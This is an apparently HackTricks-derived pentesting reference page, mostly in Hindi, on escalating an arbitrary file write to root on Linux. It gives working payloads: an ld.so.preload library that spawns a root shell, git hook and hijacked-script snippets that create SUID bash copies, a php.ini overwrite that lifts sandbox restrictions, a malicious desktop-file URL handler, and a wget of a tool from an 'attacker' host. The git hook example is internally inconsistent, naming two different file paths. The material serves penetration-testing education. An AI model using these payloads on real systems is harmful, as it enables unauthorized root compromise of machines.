# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env variable की तरह व्यवहार करती है, लेकिन यह **SUID binaries** में भी काम करती है।\
यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप प्रत्येक चलाए गए binary के साथ लोड होने वाली लाइब्रेरी का एक **path** जोड़ सकते हैं।

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) वे **scripts** हैं जो git रिपॉज़िटरी में विभिन्न **events** पर **run** होते हैं, जैसे जब कोई commit बनाया जाता है, merge होता है... इसलिए अगर कोई **privileged script or user** ये क्रियाएँ बार-बार कर रहा हो और **write in the `.git` folder** संभव हो, तो इसका उपयोग **privesc** के लिए किया जा सकता है।

उदाहरण के लिए, git repo में **`.git/hooks`** में **generate a script** करना संभव है ताकि यह हर नए commit के बनने पर हमेशा executed हो:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & Time files

TODO

### Service & Socket files

TODO

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

कुछ custom daemons user-supplied PHP को validate करते हैं `php` को एक **restricted `php.ini`** के साथ चलाकर (उदाहरण के लिए, `disable_functions=exec,system,...`)। अगर sandboxed code के पास अभी भी **कोई भी write primitive** (जैसे `file_put_contents`) है और आप daemon द्वारा उपयोग किए गए **सटीक `php.ini` path** तक पहुँच सकते हैं, तो आप उस config को **overwrite** करके प्रतिबंध हटा सकते हैं और फिर एक दूसरा payload submit कर सकते हैं जो उन्नत privileges के साथ चलता है।

Typical flow:

1. पहला payload sandbox config को ओवरराइट करता है।
2. दूसरा payload कोड चलाता है क्योंकि खतरनाक फ़ंक्शन्स पुनः सक्षम किए गए हैं।

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

एक ऐसा attacker जिसके पास victim के configuration directories में write permissions हों, आसानी से ऐसी फ़ाइलें replace या create कर सकता है जो system व्यवहार बदल दें और अनिच्छित code execution का कारण बनें। `$HOME/.config/mimeapps.list` फ़ाइल को बदलकर HTTP और HTTPS URL handlers को किसी malicious फ़ाइल की ओर पॉइंट करने के लिए (उदाहरण के लिए `x-scheme-handler/http=evil.desktop` सेट करना), attacker यह सुनिश्चित करता है कि **किसी भी http या https लिंक पर क्लिक करने से उस `evil.desktop` फ़ाइल में निर्दिष्ट code ट्रिगर हो**। उदाहरण के लिए, `$HOME/.local/share/applications` में `evil.desktop` में निम्नलिखित malicious code रखने के बाद, कोई भी external URL क्लिक embedded कमांड चला देता है:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
अधिक जानकारी के लिए [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) देखें जहाँ इसे एक वास्तविक vulnerability को exploit करने के लिए उपयोग किया गया था।

### Root द्वारा चलाए जाने वाले user-writable scripts/binaries

यदि कोई privileged workflow `/bin/sh /home/username/.../script` (या किसी भी binary जो unprivileged user के स्वामित्व वाले डायरेक्टरी के अंदर है) जैसी चीज़ चलाता है, तो आप इसे hijack कर सकते हैं:

- **Detect the execution:** प्रक्रियाओं की निगरानी के लिए [pspy](https://github.com/DominicBreuker/pspy) का उपयोग करें ताकि root द्वारा user-controlled paths को invoke करते हुए पकड़ा जा सके:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** सुनिश्चित करें कि लक्ष्य फ़ाइल और उसकी निर्देशिका दोनों आपके उपयोगकर्ता द्वारा मालिकाना/लिखने योग्य हों।
- **Hijack the target:** मूल binary/script का बैकअप लें और एक payload डालें जो एक SUID shell (या कोई अन्य root action) बनाता है, फिर अनुमतियाँ पुनर्स्थापित करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **विशेषाधिकार प्राप्त क्रिया ट्रिगर करें** (उदा., UI बटन दबाने पर helper spawn होता है)। जब root hijacked path को पुनः निष्पादित करता है, तब `./rootshell -p` से escalated shell प्राप्त करें।

## संदर्भ

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
